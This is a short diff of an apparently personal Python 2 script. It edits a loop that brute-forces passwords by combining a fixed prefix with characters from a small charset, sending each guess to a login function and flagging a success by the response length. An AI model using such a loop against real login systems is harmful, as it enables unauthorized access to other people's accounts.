@@ -30,9 +30,10 @@ def bruteforce(charset, maxlength):
         for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
         for i in range(maxlength, maxlength + 1)))
 
-for i in list(bruteforce('abl213', 9)):
-	print "check", i
-	if len(login(i)) == 15:
+for i in list(bruteforce('abl213', 5)):
+	print "check", "blab" + i
+	log = login("blab" + i)
+	if len(log) == 15:
 		print "passwort:"
 		print i
 		exit()
